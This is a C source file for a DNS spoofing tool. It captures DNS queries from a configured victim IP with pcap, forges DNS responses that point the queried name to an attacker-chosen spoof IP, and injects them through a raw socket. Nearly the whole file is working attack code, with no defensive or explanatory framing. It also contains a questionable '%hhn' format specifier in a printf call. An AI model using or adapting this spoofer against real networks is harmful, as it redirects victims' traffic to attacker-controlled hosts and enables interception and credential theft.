#include "dns.h"

void dns_sniff(struct config *c)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *nic_descr;
    struct bpf_program fp;
    bpf_u_int32 maskp;
    bpf_u_int32 netp;
    int filter_len = 28;

    char filter_exp[filter_len + strlen(getIPString(c->victimIP))];

    snprintf(filter_exp, filter_len + strlen(getIPString(c->victimIP)), "ip src %s and udp dst port 53", getIPString(c->victimIP));

    printf("\nVictim: %hhn %s \n", c->victimIP, getIPString(c->victimIP));
    printf("filter: %s\n", filter_exp);

    pcap_lookupnet(c->interfaceName, &netp, &maskp, errbuf);

    nic_descr = pcap_open_live(c->interfaceName, BUFSIZ, 1, -1, errbuf);
    if (nic_descr == NULL)
    {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(1);
    }

    if (pcap_compile(nic_descr, &fp, filter_exp, 0, netp) == -1)
    {
        fprintf(stderr, "Error calling pcap_compile\n");
        exit(1);
    }

    if (pcap_setfilter(nic_descr, &fp) == -1)
    {
        fprintf(stderr, "Error setting filter\n");
        exit(1);
    }

    fprintf(stdout, "\n------------------------------\n\n");

    // Start the capture session
    pcap_loop(nic_descr, 0, handle_packet, (u_char *)c);
}

void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    u_char *spoof_packet;
    struct my_ip *spoof_ip;
    struct udp_header *spoof_udp;
    u_char *dns_spoof;
    int packet_len = 0;
    int dns_len = 0;
    struct config *c = (struct config *)args;

    packet_len = sizeof(struct my_ip) + sizeof(struct udp_header) +
                 sizeof(struct dns_header) + sizeof(struct dns_answer) - 4 +
                 sizeof(struct dns_query) + c->targetLen;
    ;

    spoof_packet = (u_char *)malloc(packet_len);
    dns_len = sizeof(struct dns_header) + sizeof(struct dns_answer) + sizeof(struct dns_query) + c->targetLen - 4;

    spoof_ip = (struct my_ip *)malloc(sizeof(struct my_ip));
    spoof_udp = (struct udp_header *)malloc(sizeof(struct udp_header));
    dns_spoof = (u_char *)malloc(dns_len);

    handle_IP(pkthdr, packet, spoof_ip);
    handle_UDP(packet, spoof_udp);
    printf("New: %d\n", spoof_udp->len);

    handle_DNS(c, packet, dns_spoof);

    memcpy(spoof_packet, spoof_ip, sizeof(struct my_ip));
    memcpy(spoof_packet + sizeof(struct my_ip), spoof_udp, sizeof(struct udp_header));
    memcpy(spoof_packet + sizeof(struct my_ip) + sizeof(struct udp_header), dns_spoof, dns_len);

    struct pseudo_header pseudo_header;
    memcpy(&pseudo_header.source_address, &c->routerIP, IP_LEN);
    memcpy(&pseudo_header.dest_address, &c->victimIP, IP_LEN);
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_UDP;
    pseudo_header.udp_length = htons(8);

    u_char *temp_header = (u_char *)malloc(sizeof(struct pseudo_header) + dns_len);
    memcpy(temp_header, &pseudo_header, sizeof(struct pseudo_header));
    memcpy(temp_header + sizeof(struct pseudo_header), dns_spoof, dns_len);

    spoof_udp->sum = in_cksum((unsigned short *)temp_header, sizeof(struct pseudo_header) + dns_len);

    for (int x = 0; x < packet_len; x++)
    {
        if (x % 10 == 0 && x != 0)
            fprintf(stdout, "\n");
        fprintf(stdout, "%02x ", *(spoof_packet + x));
    }

    send_dns_answer(inet_ntoa(spoof_ip->ip_dst), spoof_udp->dport, spoof_packet, packet_len);
}

void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my_ip *spoof_ip)
{
    const struct my_ip *ip;
    u_int length = pkthdr->len;
    u_int hlen, version;
    int len;

    // Jump past the Ethernet header
    ip = (struct my_ip *)(packet + sizeof(struct ether_header));
    length -= sizeof(struct ether_header);

    // make sure that the packet is of a valid length
    if (length < sizeof(struct my_ip))
    {
        printf("Truncated IP %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);

    fprintf(stdout, "\n\nOrig: \n");
    fprintf(stdout, "Src: %s -> ", inet_ntoa(ip->ip_src));
    fprintf(stdout, "Dst: %s \n\n", inet_ntoa(ip->ip_dst));

    // Spoof IP
    memcpy(spoof_ip, ip, sizeof(struct my_ip));
    memcpy(&spoof_ip->ip_dst, &ip->ip_src, IP_LEN);
    memcpy(&spoof_ip->ip_src, &ip->ip_dst, IP_LEN);

    spoof_ip->ip_len += 16;
    spoof_ip->ip_sum = in_cksum((u_short *)spoof_ip, sizeof(struct my_ip));

    // verify version
    if (version != 4)
    {
        fprintf(stdout, "Unknown version %d\n", version);
        exit(1);
    }

    // verify the header length */
    if (hlen < 5)
    {
        fprintf(stdout, "Bad header length %d \n", hlen);
    }
    // Ensure that we have as much of the packet as we should
    if (length < len)
        printf("\nTruncated IP - %d bytes missing\n", len - length);
}

void handle_UDP(const u_char *packet, struct udp_header *spoof_udp)
{
    const struct udp_header *udp = 0; // The UDP header
    const struct my_ip *ip;           // The IP header
    int size_ip;

    ip = (struct my_ip *)(packet + ETH_HEADER_LENGTH);
    size_ip = IP_HL(ip) * 4;

    // define/compute tcp header offset
    udp = (struct udp_header *)(packet + ETH_HEADER_LENGTH + size_ip);

    memcpy(spoof_udp, udp, sizeof(struct udp_header));
    spoof_udp->dport = udp->sport;
    spoof_udp->sport = udp->dport;
    spoof_udp->len = htons(ntohs(udp->len) + 16);
}

void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
{
    struct dns_header *dns_header;
    struct dns_answer *dns_answer;
    struct dns_query *dns_query;

    int frontLen = ETH_HEADER_LENGTH + sizeof(struct my_ip) + sizeof(struct udp_header);
    dns_header = (struct dns_header *)(packet + frontLen);
    dns_query = (struct dns_query *)(packet + frontLen + sizeof(struct dns_header) + c->targetLen);
    dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);

    dns_header->flags = htons(0x8180);
    dns_header->ancount = htons(1);

    dns_answer->name = htons(0xc00c);
    dns_answer->type = htons(1);
    dns_answer->class = htons(1);
    dns_answer->ttl = htonl(0x00012c56);
    dns_answer->len = htons(4);
    memcpy(&dns_answer->addr, c->spoofIP, IP_LEN);

    // Fill dns spoof
    memcpy(dns_spoof, dns_header, sizeof(struct dns_header));
    memcpy(dns_spoof + sizeof(struct dns_header), packet + frontLen + sizeof(struct dns_header), c->targetLen);

    memcpy(dns_spoof + sizeof(struct dns_header) + c->targetLen, dns_query, sizeof(struct dns_query));

    printf("Q: %02x %02x | ", *dns_query->type, *dns_query->type + 1);
    printf(" %02x %02x\n", *dns_query->class, *dns_query->class + 1);

    int ahead = sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen;
    memcpy(dns_spoof + ahead, &dns_answer->name, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->type, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->class, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->ttl, 4);
    memcpy(dns_spoof + (ahead += 4), &dns_answer->len, 2);
    memcpy(dns_spoof + (ahead += 2), &dns_answer->addr, 4);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void send_dns_answer(char *ip, u_short port, u_char *packet, int packlen)
{
    struct sockaddr_in to_addr;
    int bytes_sent;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    const int *val = &one;

    if (sock < 0)
    {
        fprintf(stderr, "Error creating socket");
        return;
    }
    to_addr.sin_family = AF_INET;
    to_addr.sin_port = port;
    to_addr.sin_addr.s_addr = inet_addr(ip);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error at setsockopt()");
        return;
    }

    bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
    if (bytes_sent < 0)
        fprintf(stderr, "Error sending dat\n");
}